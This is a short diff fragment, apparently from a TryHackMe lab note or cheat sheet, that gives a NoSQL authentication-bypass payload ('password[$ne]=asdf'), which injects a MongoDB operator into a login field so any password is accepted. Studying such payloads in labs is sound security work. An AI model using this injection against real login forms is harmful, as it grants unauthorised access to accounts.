@@ -10,4 +10,3 @@ Auth bypass via Mongo operator injection — try this when SQLMap finds nothing 
 username=<USER>&password[$ne]=asdf
 ```
 
-— TryHackMe / Do Not Disturb
